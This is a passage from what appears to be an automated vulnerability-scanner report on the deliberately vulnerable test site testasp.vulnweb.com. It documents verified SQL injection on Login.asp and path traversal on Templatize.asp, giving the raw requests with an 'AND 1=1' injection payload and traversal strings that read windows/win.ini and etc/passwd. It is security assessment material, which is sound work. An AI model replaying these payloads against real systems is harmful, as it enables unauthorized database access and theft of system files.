  the SQL query evaluation (a read-capable oracle)

  - `finding` ref `F-513d590d27` excerpt: `quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break`
    finding: sql_injection POST http://testasp.vulnweb.com/Login.asp param=tfUName status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 4679B vs FALSE 3167B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 4673B vs FALSE 3161B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted; the submitted form carries no anti-CSRF token field (raw fields: tfUName, tfUPass)

  - `journal` ref `req-048eb214` excerpt: `ASPSESSIONID=[REDACTED]`
    REQUEST  POST http://testasp.vulnweb.com/Login.asp
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Content-Type: application/x-www-form-urlencoded
      Cookie: ASPSESSIONID=[REDACTED]
      body: tfUName=1+AND+1%3D1&tfUPass=sentinel
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:36:56 GMT
      content-length: 3474
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f
  - `finding` ref `F-513d590d27` excerpt: `quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break`
    finding: sql_injection POST http://testasp.vulnweb.com/Login.asp param=tfUName status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 4679B vs FALSE 3167B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 4673B vs FALSE 3161B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2

**[STATE] — verified**

  no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, no destructive payload) — whether the class can cause state changes was not tested

  - `finding` ref `F-513d590d27` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
    finding: sql_injection POST http://testasp.vulnweb.com/Login.asp param=tfUName status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 4679B vs FALSE 3167B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 4673B vs FALSE 3161B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2

**[IMPACT] — verified**

  Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was demonstrated, not exercised.

  - `finding` ref `F-513d590d27` excerpt: `impact grade=proven; chain: oracle:or-bodydiff-2round on POST http://testasp.vulnweb.com/Login.asp`
    finding: sql_injection POST http://testasp.vulnweb.com/Login.asp param=tfUName status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 4679B vs FALSE 3167B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 4673B vs FALSE 3161B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2

</details>


### AP-e40dee9e6d — VERIFIED — path_traversal at /Templatize.asp — single-finding path
*Every link below carries verified evidence. The path is fully proven.*

findings: F-acb5de3e87 | chain_rule: — | mitigations absent: []

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie ASPSESSIONIDAABRTDSA carried by the raw proving requests; issued by the target on response req-1a16cfe2 (an unauthenticated fetch of a public surface); no Authorization/credential material  |
| **entry** | verified | GET http://testasp.vulnweb.com/Templatize.asp — parameter item |
| **action** | verified | dot-dot traversal sequences injected into the path/parameter to escape the document root |
| **object** | verified | the local filesystem outside the document root |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted |
| **state** | verified | no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, |
| **impact** | verified | File reads outside the document root proven with a marker file — arbitrary local file disclosure (configuration, secrets, source) is reachable. |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie ASPSESSIONIDAABRTDSA carried by the raw proving requests; issued by the target on response req-1a16cfe2 (an unauthenticated fetch of a public surface); no Authorization/credential material in any proving request

  - `journal` ref `req-e7689fc2` excerpt: `ASPSESSIONID=[REDACTED]`
    REQUEST  GET http://testasp.vulnweb.com/Templatize.asp?item=..%2F..%2F..%2F..%2Fwindows%2Fwin.ini
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: ASPSESSIONID=[REDACTED]
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:31:18 GMT
      content-length: 2783
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f
  - `journal` ref `req-1a16cfe2` excerpt: `ASPSESSIONID=[REDACTED]; path=/`
    REQUEST  GET http://testasp.vulnweb.com
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      set-cookie: ASPSESSIONID=[REDACTED]; path=/
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:30:52 GMT
      content-length: 3542
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f
  - `finding` ref `F-acb5de3e87` excerpt: `content of win.ini leaked (marker '[fonts]' at offset 1905)`
    finding: path_traversal GET http://testasp.vulnweb.com/Templatize.asp param=item status=verified conf=0.9
      evidence[file_marker]: content of win.ini leaked (marker '[fonts]' at offset 1905)
      evidence[file_marker]: content of win.ini leaked (marker '[fonts]' at offset 1949)
      verification: re-test:same-marker-alt-depth passed=True conf=0.9 rounds=3

**[ENTRY] — verified**

  GET http://testasp.vulnweb.com/Templatize.asp — parameter item

  - `finding` ref `F-acb5de3e87` excerpt: `content of win.ini leaked (marker '[fonts]' at offset 1905)`
    finding: path_traversal GET http://testasp.vulnweb.com/Templatize.asp param=item status=verified conf=0.9
      evidence[file_marker]: content of win.ini leaked (marker '[fonts]' at offset 1905)
      evidence[file_marker]: content of win.ini leaked (marker '[fonts]' at offset 1949)
      verification: re-test:same-marker-alt-depth passed=True conf=0.9 rounds=3
  - `journal` ref `req-3420a1ec` excerpt: `http://testasp.vulnweb.com/Templatize.asp?item=..%2F..%2F..%2F..%2Fetc%2Fpasswd`
    REQUEST  GET http://testasp.vulnweb.com/Templatize.asp?item=..%2F..%2F..%2F..%2Fetc%2Fpasswd
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: ASPSESSIONID=[REDACTED]
    RESPONSE 500
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:31:18 GMT
      content-length: 1208
      body[0:200]: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" cont

**[ACTION] — verified**

  dot-dot traversal sequences injected into the path/parameter to escape the document root

  - `finding` ref `F-acb5de3e87` excerpt: `verification: re-test:same-marker-alt-depth (passed=True)`
    finding: path_traversal GET http://testasp.vulnweb.com/Templatize.asp param=item status=verified conf=0.9
      evidence[file_marker]: content of win.ini leaked (marker '[fonts]' at offset 1905)
      evidence[file_marker]: content of win.ini leaked (marker '[fonts]' at offset 1949)
      verification: re-test:same-marker-alt-depth passed=True conf=0.9 rounds=3
  - `journal` ref `req-3420a1ec` excerpt: `http://testasp.vulnweb.com/Templatize.asp?item=..%2F..%2F..%2F..%2Fetc%2Fpasswd`
    REQUEST  GET http://testasp.vulnweb.com/Templatize.asp?item=..%2F..%2F..%2F..%2Fetc%2Fpasswd
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: ASPSESSIONID=[REDACTED]
    RESPONSE 500
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:31:18 GMT
      content-length: 1208
      body[0:200]: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" cont

**[OBJECT] — verified**

  the local filesystem outside the document root

  - `finding` ref `F-acb5de3e87` excerpt: `content of win.ini leaked (marker '[fonts]' at offset 1905)`
    finding: path_traversal GET http://testasp.vulnweb.com/Templatize.asp param=item status=verified conf=0.9
      evidence[file_marker]: content of win.ini leaked (marker '[fonts]' at offset 1905)
      evidence[file_marker]: content of win.ini leaked (marker '[fonts]' at offset 1949)
      verification: re-test:same-marker-alt-depth passed=True conf=0.9 rounds=3

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted

  - `journal` ref `req-3420a1ec` excerpt: `ASPSESSIONID=[REDACTED]`
    REQUEST  GET http://testasp.vulnweb.com/Templatize.asp?item=..%2F..%2F..%2F..%2Fetc%2Fpasswd
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: ASPSESSIONID=[REDACTED]
    RESPONSE 500
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:31:18 GMT
      content-length: 1208
      body[0:200]: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" cont
  - `finding` ref `F-acb5de3e87` excerpt: `content of win.ini leaked (marker '[fonts]' at offset 1905)`
    finding: path_traversal GET http://testasp.vulnweb.com/Templatize.asp param=item status=verified conf=0.9
      evidence[file_marker]: content of win.ini leaked (marker '[fonts]' at offset 1905)
      evidence[file_marker]: content of win.ini leaked (marker '[fonts]' at offset 1949)
      verification: re-test:same-marker-alt-depth passed=True conf=0.9 rounds=3

**[STATE] — verified**

  no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, no destructive payload) — whether the class can cause state changes was not tested

  - `finding` ref `F-acb5de3e87` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
    finding: path_traversal GET http://testasp.vulnweb.com/Templatize.asp param=item status=verified conf=0.9
      evidence[file_marker]: content of win.ini leaked (marker '[fonts]' at offset 1905)
      evidence[file_marker]: content of win.ini leaked (marker '[fonts]' at offset 1949)
      verification: re-test:same-marker-alt-depth passed=True conf=0.9 rounds=3

**[IMPACT] — verified**

  File reads outside the document root proven with a marker file — arbitrary local file disclosure (configuration, secrets, source) is reachable.

  - `finding` ref `F-acb5de3e87` excerpt: `impact grade=proven; chain: re-test:same-marker-alt-depth on GET http://testasp.vulnweb.com/Templatize.asp`
    finding: path_traversal GET http://testasp.vulnweb.com/Templatize.asp param=item status=verified conf=0.9
      evidence[file_marker]: content of win.ini leaked (marker '[fonts]' at offset 1905)
      evidence[file_marker]: content of win.ini leaked (marker '[fonts]' at offset 1949)
      verification: re-test:same-marker-alt-depth passed=True conf=0.9 rounds=3

</details>


## Evidence cross-checks

**ALL CHECKS PASSED** — every journal citation exists in the journal and every excerpt is a literal slice of the cited raw entry (substring-verified evidence).
